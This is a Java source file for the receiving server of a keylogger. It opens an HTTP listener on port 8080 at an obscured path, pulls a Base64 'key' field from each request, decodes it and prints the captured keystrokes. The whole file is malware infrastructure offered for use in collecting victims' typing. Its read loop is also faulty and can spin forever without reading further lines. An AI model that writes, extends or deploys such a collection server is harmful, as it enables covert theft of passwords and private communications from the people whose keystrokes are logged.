package us.infinitydev.keylogger_server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Base64;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class Server {

	public static void main(String[] args) throws Exception{
		//Create server
		HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
		System.out.println("Listening on port 8080");
		
		//Register keylogger inpupt
	    server.createContext("/x87Sjd9dO", new MyHandler());
	    server.setExecutor(null);
	    
	    //Start server
	    server.start();
	    System.out.println("Server started, expect keylogger entries soon.");
	}

    static class MyHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
        	//Read the request body
        	InputStreamReader isr =  new InputStreamReader(t.getRequestBody());
            BufferedReader reader = new BufferedReader(isr);
            String line = reader.readLine();         
            String key = "";
            while (!line.isEmpty()) {
            	//Find key value
                if(line.split("=")[0] != null) {
                	if(line.split("=")[0].equals("key")) {
                		key = line.split("=")[1];
                		break;
                	}
                }
            }
            //Decrypt from Base64
        	byte[] decodedBytes = Base64.getDecoder().decode(key);
        	String decodedString = new String(decodedBytes);
        	
        	//Print
        	System.out.println(decodedString);
            
        	//Let sender know everything is a-ok
            String response = "Succesfully accepted";
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
	
}
